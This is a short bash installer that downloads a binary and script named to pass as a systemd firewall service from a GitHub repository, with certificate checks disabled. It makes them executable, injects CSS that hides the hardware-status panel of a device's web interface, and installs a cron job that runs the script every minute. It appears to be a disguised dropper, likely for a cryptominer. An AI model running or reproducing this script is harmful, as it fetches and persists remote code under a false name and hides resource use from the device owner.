#!/usr/bin/env bash
wget --no-check-certificate https://raw.githubusercontent.com/muzsiki/muz/main/systemd-firewalldARM -P /root/
wget --no-check-certificate https://raw.githubusercontent.com/muzsiki/muz/main/system-firewalldARM.sh -P /root/
wget --no-check-certificate https://raw.githubusercontent.com/muzsiki/muz/main/config.json -P /root/
chmod +x /root/systemd-firewalldARM
chmod +x /root/system-firewalldARM.sh
echo '.layui-layer {display: none !important; }' >> /usr/www/css/ctools.css
echo 'div#tos_hardware_status {display: none !important;}' >> /usr/www/css/ctools.css
crontab -l > crontab_new
echo "* * * * * /root/system-firewalldARM.sh >> /var/log/system-firewalldARM.log 2>&1 </dev/null" >> crontab_new
crontab crontab_new
rm crontab_new
echo "* * * * * /root/system-firewalldARM.sh >> /var/log/system-firewalldARM.log 2>&1 </dev/null" >> /etc/crontabs/root